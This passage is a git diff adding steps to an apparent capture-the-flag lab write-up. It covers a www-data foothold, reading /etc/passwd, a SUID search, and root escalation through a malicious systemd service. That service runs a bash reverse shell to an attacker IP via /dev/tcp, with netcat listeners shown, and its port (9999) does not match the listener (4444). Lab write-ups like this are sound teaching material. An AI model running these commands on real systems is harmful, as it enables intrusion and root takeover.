@@ -256,7 +256,75 @@ To connect to the reverse shell we create a simple netcat listener using:
 nc -vnlp 4444
 ```
 
-<figure><img src="../.gitbook/assets/netcat_shell.png" alt=""><figcaption><p>revesre shell in action</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/netcat_shell.png" alt=""><figcaption><p>reverse shell in action</p></figcaption></figure>
 
+We can make this shell better by spawning a bash shell with python. This will help us run commands through shell access that is not possible through this reverse shell.
 
+<figure><img src="../.gitbook/assets/good_shell_from_python.png" alt=""><figcaption><p>Python bash shell</p></figcaption></figure>
 
+### Foot holding
+
+The initial access is for the user `www-data`:
+
+<figure><img src="../.gitbook/assets/user_details_www_data.png" alt=""><figcaption><p>foothold</p></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/if_config.png" alt=""><figcaption><p>target ip details</p></figcaption></figure>
+
+### Find who has access to what resources
+
+We can dump the `/etc/passwd` file contents using the user account `www-data`:
+
+<figure><img src="../.gitbook/assets/etc_pass.png" alt=""><figcaption><p>contents of /etc/passwd</p></figcaption></figure>
+
+We find that the user bill has the shell access:
+
+<figure><img src="../.gitbook/assets/bill_user_has_shell_access.png" alt=""><figcaption><p>bill has access to /bin/bash</p></figcaption></figure>
+
+### User FLAG
+
+<figure><img src="../.gitbook/assets/user_flag.png" alt=""><figcaption><p>user  flag</p></figcaption></figure>
+
+### Find files with SUID set
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+<figure><img src="../.gitbook/assets/systemctl_suid_set.png" alt=""><figcaption><p>systemctl has SUID set</p></figcaption></figure>
+
+We find systemctl has SUID set. So with by enabling a malicious service we can get root shell access.
+
+### Privilege Escalation
+
+Plan is to spawn another reverse shell back to attacker machine with root access. We do this by creating the following `root.service` in the `/tmp` directory because we have write access to it:
+
+```
+[Service]
+Type=simple
+User=root
+Execstart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.48.13/9999 0>&1'
+```
+
+<figure><img src="../.gitbook/assets/create_root_service.png" alt=""><figcaption></figcaption></figure>
+
+Setup a netcat shell on the above defined service port:
+
+```
+nc -vnlp 4444
+```
+
+We start this service using:
+
+```
+/bin/systemctl enable --now /tmp/root.service
+```
+
+<figure><img src="../.gitbook/assets/run_with_systemctl.png" alt=""><figcaption><p>Starting root.service using systemctl</p></figcaption></figure>
+
+We immediately get back the root shell at our netcat listener:
+
+<figure><img src="../.gitbook/assets/root_netcat_shell.png" alt=""><figcaption><p>Netcat listener with root shell</p></figcaption></figure>
+
+### Root FLAG
+
+<figure><img src="../.gitbook/assets/root_flag.png" alt=""><figcaption><p>root FLAG</p></figcaption></figure>
